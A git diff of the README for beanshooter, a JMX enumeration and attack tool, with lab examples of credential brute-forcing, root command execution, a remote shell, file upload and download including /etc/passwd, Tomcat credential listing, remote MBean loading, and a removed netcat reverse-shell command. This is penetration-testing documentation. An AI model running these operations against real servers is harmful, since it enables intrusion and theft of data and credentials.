@@ -6,7 +6,7 @@
 
 ![](https://github.com/qtc-de/beanshooter/workflows/master%20maven%20CI/badge.svg?branch=master)
 ![](https://github.com/qtc-de/beanshooter/workflows/develop%20maven%20CI/badge.svg?branch=develop)
-[![](https://img.shields.io/badge/version-3.0.0--rc.1-blue)](https://github.com/qtc-de/beanshooter/releases)
+[![](https://img.shields.io/badge/version-3.0.0--rc.2-blue)](https://github.com/qtc-de/beanshooter/releases)
 [![](https://img.shields.io/badge/build%20system-maven-blue)](https://maven.apache.org/)
 ![](https://img.shields.io/badge/java-8%2b-blue)
 [![](https://img.shields.io/badge/license-GPL%20v3.0-blue)](https://github.com/qtc-de/beanshooter/blob/master/LICENSE)
@@ -41,7 +41,7 @@ https://user-images.githubusercontent.com/49147108/157600758-12124037-4e22-4c60-
       + [undeploy](#generic-undeploy)
     - [tonka](#tonka)
       + [exec](#tonka-exec)
-      + [background](#tonka-background)
+      + [execarray](#tonka-execarray)
       + [shell](#tonka-shell)
       + [upload](#tonka-upload)
       + [download](#tonka-download)
@@ -61,9 +61,9 @@ https://user-images.githubusercontent.com/49147108/157600758-12124037-4e22-4c60-
 installed, just execute the following commands to create an executable ``.jar`` file:
 
 ```console
-$ git clone https://github.com/qtc-de/beanshooter
-$ cd beanshooter
-$ mvn package
+[qtc@devbox ~]$ git clone https://github.com/qtc-de/beanshooter
+[qtc@devbox ~]$ cd beanshooter
+[qtc@devbox ~]$ mvn package
 ```
 
 You can also use prebuild packages that are created for [each release](https://github.com/qtc-de/beanshooter/releases).
@@ -80,7 +80,7 @@ copying the [completion script](/resources/bash_completion.d/beanshooter) to you
 autocompletion.
 
 ```console
-$ cp resources/bash_completion.d/beanshooter ~/bash_completion.d/
+[qtc@devbox ~]$ cp resources/bash_completion.d/beanshooter ~/bash_completion.d/
 ```
 
 
@@ -99,7 +99,7 @@ usage: beanshooter [-h]   ...
 beanshooter v3.0.0 - a JMX enumeration and attacking tool
 
 positional arguments:
-                          
+
  Basic Operations
     brute                bruteforce JMX credentials
     invoke               invoke the specified method on the specified MBean
@@ -149,25 +149,32 @@ dedicated attacks you should use the `--username-file` and `--password-file` opt
 #### Invoke
 
 The `invoke` action can be used to invoke an arbitrary method on an *MBean* that has already been deployed on a *JMX* endpoint.
-Apart from the target, the `invoke` action requires the `ObjectName` of the targeted *MBean*, the method name you want to invoke
-and the arguments to use for the call. *MBean* attributes can also be obtained by this action, by using the corresponding getter
-function as method. The following listing shows an example, where the `getLoggerNames` function is invoked on the `Logging` *MBean*:
+Apart from the target, the `invoke` action requires the `ObjectName` of the targeted *MBean* and the method signature you
+want to invoke. If the specified method expects arguments, these also have to be specified. *MBean* attributes can also be
+obtained by this action, by using the corresponding getter function as method. The following listing shows an example, where
+the `getLoggerNames` function is invoked on the `Logging` *MBean*:
 
 ```console
-[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 'java.util.logging:type=Logging' getLoggerNames ''
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 'java.util.logging:type=Logging' --signature 'getLoggerNames()'
 [+] sun.rmi.transport.tcp
 [+] sun.rmi.server.call
 [+] sun.rmi.loader
 ...
 ```
 
-When invoking a method that requires arguments, the last *beanshooter* argument is evaluated as *Java code* and attempted to be
-parsed as `Object[]`. The following listing shows an example, where the `getLoggerNames` function is invoked on the `Logging` *MBean*.
+When invoking a method that requires parameters, the specified *beanshooter* arguments are evaluated as *Java code*. Simple argument
+types like integers or strings can just be passed by specifying their corresponding value. Complex argument types can be constructed
+as you would do it in *Java* (e.g. `'new java.util.HashMap()'`). The following listing shows an example, where the `setLoggerNames`
+function is invoked on the `Logging` *MBean*:
 
 ```console
-[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 'java.util.logging:type=Logging' setLoggerLevel '"sun.rmi.transport.tcp", "INFO"'
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 'java.util.logging:type=Logging' --signature 'setLoggerLevel(String arg1, String arg2)' sun.rmi.transport.tcp INFO
 [+] Call was successful
 ```
+
+For more complex argument types that require some initialization, you can use *beanshooters PluginSystem* and define a custom
+class that implements the [IArgumentProvider Interface](beanshooter/src/de/qtc/beanshooter/plugin/IArgumentProvider.java).
+
 
 #### Deploy
 
@@ -241,7 +248,7 @@ The `enum` action enumerates some configuration details on a *JMX* endpoint. It 
 [+] 	  Configuration Status: Non Defau
 ```
 
-When no authentication is required, or when you specify valid credentials, the `enum` action also attempts to
+When authentication is not required, or when you specify valid credentials, the `enum` action also attempts to
 enumerate some further information from the *JMX* endpoint. This includes a list of non default *MBeans* and
 e.g. the user accounts registered on a *Apache tomcat* server:
 
@@ -285,6 +292,22 @@ e.g. the user accounts registered on a *Apache tomcat* server:
 [+] 			   Users:type=Role,rolename="admin-gui",database=UserDatabase
 [+] 			   Users:type=Role,rolename="admin-script",database=UserDatabase
 [...]
+```
+
+When invoking the `enum` action on a *SASL* protected endpoint, *beanshooter* attempts to enumerate the *SASL* profile
+that is configured for the server. This is only possible to a certain extend and the *TLS* configuration of the server
+cannot be enumerated. If the *SASL* profile identified by *beanshooter* does not work, you should always retry with/without
+the `--ssl` option:
+
+```console
+[qtc@devbox ~]$ beanshooter enum 172.17.0.2 4447 --jmxmp
+[+] Checking servers SASL configuration:
+[+]
+[+] 	- Remote JMXMP server uses SASL/DIGEST-MD5 SASL profile.
+[+] 	  Credentials are requried and the following hostname must be used: iinsecure.dev
+[+] 	  Notice: TLS setting cannot be enumerated and --ssl may be required.
+[+] 	  Vulnerability Status: Non Vulnerable
+...
 ```
 
 #### List
@@ -337,13 +360,16 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+Against *JMXMP* endpoints, preauthenticated deserialization is usually possible. Unfortunately, there is no way to enumerate this properly
+during the `enum` action. If you encounter a *JMXMP* endpoint, you should just give it a try.
+
 #### Stager
 
 The `stager` action starts a stager server that can be used to deliver *MBeans*. Creating a stager server
 for *MBean* delivery is normally done automatically when using *beanshooters* `deploy` action. However,
 sometimes it is required to use a standalone server. When using the `stager` action, you can either specify
-the name of a builtin *MBean* to deliver or the keyword `custom`. If `custom` was specified, the `--class-name`,
-`--object-name` and `--jar-file` options are required.
+the name of a builtin *MBean* to deliver (e.g. `tonka`) or the `custom` keyword. If `custom` was specified,
+the `--class-name`, `--object-name` and `--jar-file` options are required.
 
 ```console
 [qtc@devbox ~]$ beanshooter tonka deploy 172.17.0.2 9010 --stager-url http://172.17.0.1:8888 --no-stager
@@ -394,7 +420,7 @@ listing shows an example for the `mlet` *MBean* and the associated subparser:
 usage: beanshooter mlet [-h]   ...
 
 positional arguments:
-                          
+
     load                 load a new MBean from the specified URL
     status               checks whether the MBean is registered
     info                 print detailed information about the MBean
@@ -410,11 +436,11 @@ named arguments:
 
 ---
 
-Some *beanshooter* operations are available on each *MBean* and are demonstrated in this section.
+Some *beanshooter* operations are available for each *MBean* and are demonstrated in this section.
 
 #### Generic Info
 
-The `info` action lists some information on the specified *MBean*:
+The `info` action lists some general information on the specified *MBean*:
 
 ```console
 [qtc@devbox ~]$ beanshooter tonka info
@@ -426,7 +452,7 @@ The `info` action lists some information on the specified *MBean*:
 
 The `Jar File` information indicates whether an implementation of the corresponding *MBean* is builtin
 into *beanshooter*. This jar file is used during deployment, if not overwritten using the `--jar-file`
-option.
+option. Currently, the *TonkaBean* is the only *MBean* that has a *Jar File* available.
 
 #### Generic Status
 
@@ -459,7 +485,7 @@ form an *SMB* service listening on `10.10.10.5`, you could use the following com
 ```
 
 Afterwards, you can upload the exported *jar* and the `index.html` file to the *SMB* service and use the *beanshooters*
-deploy action with `--stager-url file:////10.10.10.5/share/index.html`.
+deploy action with the `--stager-url file:////10.10.10.5/share/index.html` option.
 
 #### Generic Deploy
 
@@ -530,30 +556,54 @@ The `exec` action can be used to invoke a single command on the *JMX* service:
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-#### Tonka Background
+The last argument of the exec operation is expected to be a string. When the `--shell` option is not
+used, this string is split on spaces (quotes aware) and passed as an array to the `ProcessBuilder`
+class on the server side.
 
-The `background` action executes a single command on the *JMX* server and does not wait for the command
-to finish:
+If `--shell` was used, the specified shell string is split on spaces and the resulting array is
+joined with the specified argument string before passing it to the `ProcessBuilder` class. This
+allows shell like execution with correctly interpreted shell special characters:
 
 ```console
-[qtc@devbox ~]$ beanshooter tonka background 172.17.0.2 9010 'nc 172.17.0.1 4444 -e ash'
-[+] Invoking the executeCommand method with argument: [Ljava.lang.String;@16293aa2
+[qtc@devbox ~]$ beanshooter tonka exec 172.17.0.2 9010 --shell 'ash -c' 'echo $HOSTNAME'
+[+] Invoking the executeCommand method with argument: ash -c echo $HOSTNAME
 [+] The call was successful
+[+]
+[+] Server response:
+fee2d783023b
+```
+
+For convenience, common shells are automatically suffixed with the required command string argument.
+Therefore, `--shell ash` is automatically converted to `--shell 'ash -c'`.
+
+#### Tonka Execarray
+
+The `execarray` operation is very similar to the `exec` action, but instead of expecting a string as argument
+and splitting this string on spaces to construct the command array, the `execarray` operation allows multiple
+arguments to be specified that are used directly as the command array for the `ProcessBuilder` class:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka execarray 172.17.0.2 9010 -- ash -c 'echo $HOME'
+[+] Invoking the executeCommand method with argument: ash -c echo $HOME
+[+] The call was successful
+[+]
+[+] Server response:
+/root
 ```
 
 #### Tonka Shell
 
 The `shell` action spawns a command shell where you can specify commands that are executed on the *JMX*
 server. The shell is not fully interactive and just represents a wrapper around *Javas* `Runtime.exec`
-method. However, basic support for environment variables and directory changing is implemented:
+method. However, basic support for environment variables and a current working directory is implemented:
 
 ```console
-[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010 
+[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010
 [root@172.17.0.2 /]$ id
 uid=0(root) gid=0(root) groups=0(root)
-[root@172.17.0.2 /]$ cd home
+[root@172.17.0.2 /]$ cd /home
 [root@172.17.0.2 /home]$ !env test=example
-[root@172.17.0.2 /home]$ sh -c "echo $test"
+[root@172.17.0.2 /home]$ echo $test
 example
 ```
 
@@ -561,17 +611,17 @@ The example above demonstrates how to set environment variables using the `!env`
 keyword, several others are available:
 
 ```console
-[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010 
+[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010
 [root@172.17.0.2 /]$ !help
 Available shell commands:
   <cmd>                        execute the specified command
   cd <dir>                     change working directory on the server
   exit|quit                    exit the shell
-  !help                        print this help menu
-  !env <env-str>               set new environment variables in key=value format
-  !upload <src> <dst>          upload a file to the remote MBeanServer
-  !download <src> <dst>        download a file from the remote MBeanServer
-  !background <cmd>            executes the specified command in the background
+  !help|!h                     print this help menu
+  !environ|!env <key>=<value>  set new environment variables in key=value format
+  !upload|!put <src> <dst>     upload a file to the remote MBeanServer
+  !download|!get <src> <dst>   download a file from the remote MBeanServer
+  !background|!back <cmd>      executes the specified command in the background
 ```
 
 #### Tonka Upload
@@ -579,9 +629,9 @@ Available shell commands:
 The `upload` action can be used to upload a file to the *JMX* server:
 
 ```console
-[qtc@devbox ~]$ beanshooter tonka upload 172.17.0.2 9010 ./file.dat /
-[+] Uploading local file /home/qtc/file.dat to path /file.dat on the MBeanSerer.
-[+] 30001 bytes uploaded successfully
+[qtc@devbox ~]$ beanshooter tonka upload 172.17.0.2 9010 file.dat /tmp
+[+] Uploading local file /home/qtc/file.dat to path /tmp on the MBeanSerer.
+[+] 33 bytes were written to /tmp/file.dat
 ```
 
 #### Tonka Download
@@ -589,9 +639,9 @@ The `upload` action can be used to upload a file to the *JMX* server:
 The `download` action can be used to download a file from the *JMX* server:
 
 ```console
-[qtc@devbox ~]$ beanshooter tonka download 172.17.0.2 9010 /etc/passwd .
+[qtc@devbox ~]$ beanshooter tonka download 172.17.0.2 9010 /etc/passwd
 [+] Saving remote file /etc/passwd to local path /home/qtc/passwd
-[+] 1172 bytes were written.
+[+] 1172 bytes were written to /home/qtc/passwd
 ```
 
 
@@ -600,12 +650,12 @@ The `download` action can be used to download a file from the *JMX* server:
 ---
 
 The *MLetMBean* is a well known *MBean* that can be used for loading additional *MBeans* over the
-network. It is already implicitly used by *beanshooter* `deploy` action, but can also be invoked
+network. It is already implicitly used by *beanshooters* `deploy` action, but can also be invoked
 manually using the `mlet` operation.
 
 #### MLet Load
 
-The currently only implemented *MLet* operation is the `load` operation that can be used to load
+The currently only implemented *MLet* method is the `load` operation that can be used to load
 an *MBean* class from a user specified *URL*:
 
 ```console
@@ -638,12 +688,12 @@ an *MBean* class from a user specified *URL*:
 [+] MBean was loaded successfully.
 ```
 
-The example above demonstrates how the *TonkaBean* can be loaded using the `mlet` operation. If you want
-to load a custom *MBean*, you need to specify `custom` instead of `tonka` and supply the `--class-name`,
-`--object-name` and `--jar-file` options:
+The example above demonstrates how the *TonkaBean* can be manually loaded using the `mlet` operation. If
+you want to load a custom *MBean* instead, you need to specify the keyword `custom` instead of `tonka` and supply
+the `--class-name`, `--object-name` and `--jar-file` options:
 
 ```console
-[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name de.qtc.beanshooter.tonkabean.TonkaBean --object-name MLetTonkaBean:name=TonkaBean,id=2 --jar-file www/tonka-bean.jar
+[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name de.qtc.beanshooter.ExampleBean --object-name ExampleBean:name=ExampleBean,id=1 --jar-file www/example.jar
 [+] Starting MBean deployment.
 [+] ...
 [+] MBean was loaded successfully.
@@ -659,7 +709,7 @@ accounts that are available on a *tomcat* service.
 
 #### Tomcat List
 
-The currently only implemented operation is `list`, which lists available user accounts:
+The currently only implemented operation is `list`, which lists available user accounts, their associated roles and credentials:
 
 ```console
 [qtc@devbox ~]$ beanshooter tomcat list 172.17.0.2 1090
@@ -726,15 +776,16 @@ the client to connect with a specific *SASL Profile*. Available profiles for *be
 * ntlm
 * gssapi
 
-Each of them can optionally paired with *TLS* by using the `--ssl` option. When using the `enum` action on a *SASL* protected
+Each of them can optionally be paired with *TLS* by using the `--ssl` option. When using the `enum` action on a *SASL* protected
 *JMXMP* endpoint, *beanshooter* attempts to enumerate the required *SASL* profile. Whereas determining the required *SASL*
-mechanism is usually possible, the required *TLS* setting cannot be obtained:
+mechanism is usually possible, the required *TLS* setting cannot be enumerated:
 
 ```console
 [qtc@devbox ~]$ beanshooter enum 172.17.0.2 4449 --jmxmp
 [+] Checking servers SASL configuration:
 [+]
 [+] 	- Remote JMXMP server uses SASL/NTLM SASL profile.
+[+] 	  Notice: TLS setting cannot be enumerated and --ssl may be required.
 [+] 	  Vulnerability Status: Non Vulnerable
 [+]
 [+] Checking pre-auth deserialization behavior:
@@ -747,6 +798,9 @@ mechanism is usually possible, the required *TLS* setting cannot be obtained:
 ### Example Server
 
 ---
+
+![](https://github.com/qtc-de/beanshooter/workflows/example%20server%20-%20master/badge.svg?branch=master)
+![](https://github.com/qtc-de/beanshooter/workflows/example%20server%20-%20develop/badge.svg?branch=develop)
 
 Most of the examples presented above are based on the [jmx-example-server](https://github.com/qtc-de/beanshooter/pkgs/container/beanshooter%2Fjmx-example-server)
 and the [tomcat-example-server](https://github.com/qtc-de/beanshooter/pkgs/container/beanshooter%2Ftomcat-example-server).
